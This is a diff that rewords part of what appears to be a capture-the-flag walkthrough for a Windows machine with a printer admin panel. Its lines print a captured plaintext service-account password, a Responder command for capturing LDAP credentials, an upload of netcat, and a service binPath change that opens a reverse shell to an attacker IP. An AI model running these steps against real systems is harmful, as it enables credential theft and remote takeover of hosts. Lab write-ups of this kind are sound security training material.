@@ -78,8 +78,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-- port 445 open, guest login works
-- port 80 serves a **printer admin panel**
+Port 445 is open with guest login working, and port 80 serves a **printer admin panel**.
 
 # User
 
@@ -91,7 +90,7 @@ Update it to our attack machine IP and click update, with responder running firs
 responder -i tun0
 ```
 
-**responder** grabbed the ldap request in clear text, credentials for **svc-printer**:
+**Responder** grabbed the LDAP request in clear text, handing over the credentials for **svc-printer**:
 
 > `svc-printer - 1edFg43012!!`
 
@@ -108,7 +107,7 @@ Two things worth noting — group membership and privileges:
 - **Server Operators** — built-in group with access to start and stop services
 - **SeBackupPrivilege** — can back up anything
 
-Registry key copy for the hash didn't work though.
+Copying the hash out through the registry didn't work, though.
 
 ---
 #### Note :
@@ -124,13 +123,13 @@ Upload **netcat** to the target:
 upload /usr/share/windows-resources/binaries/nc.exe
 ```
 
-**Set the path** so the `vss` service maps to `netcat` — when vss gets triggered it executes `netcat`:
+**Set the path** so the `vss` service maps to `netcat` — from then on, triggering vss executes `netcat`:
 
 ```powershell
 sc.exe config vss binPath="C:\temp\nc.exe -e cmd.exe 10.10.16.82 9002
 ```
 
-Now **stop** the `vss` service **and** **start** it again — shell lands on the listener:
+Now **stop** the `vss` service and **start** it again — a shell lands on the listener:
 
 ```powershell
 sc.exe stop vss
